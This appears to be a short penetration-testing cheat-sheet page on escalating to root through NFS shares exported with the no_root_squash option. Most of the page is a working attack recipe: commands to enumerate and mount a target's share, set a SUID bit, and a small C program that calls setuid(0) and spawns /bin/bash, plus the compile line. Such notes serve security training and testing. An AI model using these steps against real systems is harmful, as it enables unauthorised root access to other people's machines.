---
description: >-
  Network File Sharing Also can have vulnerabilities that might be used to
  escalate privileges if attacker has already root privileges on his machine
---

# NFS

When showing /etc/exports, we can find some configurations with

```
no_root_squash
```

which, instead of default change of user root to `nfsnobody`  and strip any file from operating with root privileges, will make us able to create a exec script with SUID bit and execute it on target system

Enumerate Shares

```sh
showmount -e <ip>
```

We can then mount our share

```sh
mount -o rw <ip>:/<folder or remote> <folder on attacker machine>
```

and set a SUID bit set file into the shared folder.&#x20;

```sh
chmod +s <file>
```



If doing a C executable:

```c
int main()
{
    setgid(0);
    setuid(0);
    system("/bin/bash");
    return 0;
}
```

Compile as a static file

```sh
gcc -static -o <outName> <c file>
```

